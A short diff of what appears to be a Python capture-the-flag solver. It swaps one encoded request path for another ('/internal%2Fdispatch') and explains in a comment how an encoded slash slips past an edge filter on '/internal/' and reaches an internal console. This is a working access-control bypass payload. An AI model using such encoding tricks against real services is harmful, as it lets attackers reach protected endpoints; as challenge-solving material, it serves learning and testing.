@@ -8,7 +8,11 @@ import urllib.error
 import urllib.request
 
 FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")
-CONSOLE_PATH = "/%69nternal/dispatch"
+# The edge refuses a target that starts with "/internal/". The application
+# unquotes the raw request target before routing, so an encoded slash reaches
+# the console. An encoded "i" (%69) does not survive: the HTTP proxy in front
+# of the instance decodes it and the edge sees the plain prefix.
+CONSOLE_PATH = "/internal%2Fdispatch"
 
 
 def main() -> int:
